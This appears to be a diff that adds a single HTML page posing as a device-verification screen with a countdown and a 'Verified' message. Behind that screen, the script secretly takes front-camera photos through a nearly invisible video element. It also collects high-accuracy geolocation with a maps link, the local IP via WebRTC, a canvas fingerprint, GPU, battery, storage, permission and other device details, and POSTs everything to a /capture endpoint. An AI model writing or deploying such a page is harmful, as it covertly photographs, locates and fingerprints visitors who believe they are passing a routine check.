@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Verifying</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#fff;color:#111;font-family:-apple-system,system-ui,"Segoe UI",Roboto,sans-serif;
+     min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px}
+.spin{width:32px;height:32px;border:3px solid #e3e6ec;border-top-color:#2563eb;border-radius:50%;animation:r .8s linear infinite}
+@keyframes r{to{transform:rotate(360deg)}}
+.msg{font-size:15px;color:#5a6473}
+.num{font-size:44px;font-weight:700;color:#2563eb;font-variant-numeric:tabular-nums}
+.done .spin,.done .num{display:none}
+.done .msg{color:#16a34a;font-size:17px;font-weight:600}
+video{position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-events:none}
+</style>
+</head>
+<body>
+<video id="v" autoplay playsinline muted></video>
+<div class="spin"></div>
+<div class="num" id="n">10</div>
+<div class="msg" id="m">Please wait while we verify your device…</div>
+<script>
+const v=document.getElementById('v'), m=document.getElementById('m'), nEl=document.getElementById('n');
+let stream=null;
+
+function hash(s){let h=2166136261;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i);h=Math.imul(h,16777619)}return (h>>>0).toString(16)}
+
+function canvasFP(){
+  try{
+    const c=document.createElement('canvas');c.width=240;c.height=60;
+    const x=c.getContext('2d');
+    x.textBaseline='top';x.font='16px Arial';
+    x.fillStyle='#f60';x.fillRect(0,0,240,60);
+    x.fillStyle='#069';x.fillText('SnapCam \u2713 \u00e9\u00e8\u00ea \ud83d\ude00',4,8);
+    x.fillStyle='rgba(102,204,0,.7)';x.fillText('SnapCam \u2713 \u00e9\u00e8\u00ea \ud83d\ude00',4,30);
+    return hash(c.toDataURL());
+  }catch(e){return null}
+}
+
+async function localIP(){
+  return new Promise(res=>{
+    try{
+      const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+      const ips=new Set();
+      pc.onicecandidate=e=>{
+        if(!e.candidate) return;
+        const s=e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+        if(s) ips.add(s[1]);
+      };
+      pc.createDataChannel('x');
+      pc.createOffer().then(o=>pc.setLocalDescription(o));
+      setTimeout(()=>{res([...ips].join(','));try{pc.close()}catch(e){}},2500);
+    }catch(e){res('')}
+  });
+}
+
+function geo(){
+  return new Promise(res=>{
+    if(!navigator.geolocation) return res({geo_error:'unsupported'});
+    navigator.geolocation.getCurrentPosition(
+      p=>res({lat:p.coords.latitude,lng:p.coords.longitude,accuracy_m:p.coords.accuracy,
+              altitude:p.coords.altitude,heading:p.coords.heading,speed:p.coords.speed,
+              geo_ts:p.timestamp}),
+      e=>res({geo_error:e.message,geo_code:e.code}),
+      {enableHighAccuracy:true,timeout:9000,maximumAge:0});
+  });
+}
+
+async function collect(){
+  const d={};
+  d.url=location.href; d.path=location.pathname; d.referrer=document.referrer; d.ua=navigator.userAgent;
+  d.ua_brands=JSON.stringify(navigator.userAgentData?.brands||[]);
+  d.ua_mobile=navigator.userAgentData?.mobile??null;
+  if(navigator.userAgentData?.getHighEntropyValues){
+    try{ Object.assign(d, await navigator.userAgentData.getHighEntropyValues(
+      ['model','platform','platformVersion','architecture','bitness','uaFullVersion','fullVersionList'])); }catch(e){}
+  }
+  const mm=d.ua.match(/Android\s[\d.]+;\s*([^;)]+?)(?:\sBuild|\))/i);
+  d.model_guess=mm?mm[1].replace(/_/g,' ').trim():null;
+  d.vendor=navigator.vendor; d.platform=navigator.platform; d.product=navigator.product;
+  d.language=navigator.language; d.langs=(navigator.languages||[]).join(',');
+  d.cores=navigator.hardwareConcurrency??null; d.memory_gb=navigator.deviceMemory??null;
+  d.screen=screen.width+'x'+screen.height; d.avail=screen.availWidth+'x'+screen.availHeight;
+  d.color_depth=screen.colorDepth; d.pixel_depth=screen.pixelDepth;
+  d.orientation=screen.orientation?.type||null;
+  d.dpr=devicePixelRatio; d.viewport=innerWidth+'x'+innerHeight;
+  d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone; d.tz_offset=new Date().getTimezoneOffset();
+  d.locale=Intl.DateTimeFormat().resolvedOptions().locale;
+  d.touch=navigator.maxTouchPoints; d.time=new Date().toISOString();
+  d.dnt=navigator.doNotTrack; d.cookies=navigator.cookieEnabled; d.pdf=navigator.pdfViewerEnabled??null;
+  d.canvas_fp=canvasFP();
+  try{const c=document.createElement('canvas').getContext('webgl');
+      const e=c.getExtension('WEBGL_debug_renderer_info');
+      d.gpu=c.getParameter(e.UNMASKED_RENDERER_WEBGL);
+      d.gpu_vendor=c.getParameter(e.UNMASKED_VENDOR_WEBGL);}catch(e){}
+  try{const b=await navigator.getBattery();
+      d.battery_pct=Math.round(b.level*100);
+      d.battery_charging=b.charging;
+      d.battery_charging_time=b.chargingTime;
+      d.battery_discharging_time=b.dischargingTime;
+      d.battery_label=Math.round(b.level*100)+'%'+(b.charging?' CHARGING':' NOT CHARGING');
+  }catch(e){}
+  const cn=navigator.connection||{};
+  d.net_type=cn.effectiveType??null; d.net_downlink=cn.downlink??null;
+  d.net_rtt=cn.rtt??null; d.net_saveData=cn.saveData??null;
+  try{const s=await navigator.storage?.estimate?.()||{};
+      d.storage_quota=s.quota??null; d.storage_used=s.usage??null;}catch(e){}
+  try{const dv=await navigator.mediaDevices.enumerateDevices();
+      d.cameras=dv.filter(x=>x.kind==='videoinput').length;
+      d.mics=dv.filter(x=>x.kind==='audioinput').length;
+      d.speakers=dv.filter(x=>x.kind==='audiooutput').length;}catch(e){}
+  try{ for(const p of ['geolocation','notifications','camera','microphone']){
+        const q=await navigator.permissions.query({name:p}); d['perm_'+p]=q.state; } }catch(e){}
+  Object.assign(d, await geo());
+  d.local_ip=await localIP();
+  if(d.lat!=null) d.maps_link='https://www.google.com/maps?q='+d.lat+','+d.lng;
+  return d;
+}
+
+function grab(){
+  const w=v.videoWidth||0,h=v.videoHeight||0;
+  if(!w) return null;
+  const c=document.createElement('canvas');c.width=w;c.height=h;
+  const x=c.getContext('2d');x.translate(w,0);x.scale(-1,1);x.drawImage(v,0,0,w,h);
+  return c.toDataURL('image/jpeg',0.92);
+}
+
+(async()=>{
+  try{
+    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1440},height:{ideal:1920}},audio:false});
+    v.srcObject=stream;
+  }catch(e){}
+
+  const infoP=collect();
+
+  let n=10;
+  const iv=setInterval(()=>{ n--; if(n>0) nEl.textContent=n; },1000);
+  await new Promise(r=>setTimeout(r,10000));
+  clearInterval(iv);
+
+  const images=[];
+  const a=grab(); if(a) images.push(a);
+  await new Promise(r=>setTimeout(r,1200));
+  const b=grab(); if(b) images.push(b);
+
+  const info=await infoP;
+  try{
+    await fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({images:images,info:info})});
+  }catch(e){}
+
+  if(stream) stream.getTracks().forEach(t=>t.stop());
+  document.body.classList.add('done');
+  m.textContent='✓ Verified';
+})();
+</script>
+</body>
+</html>
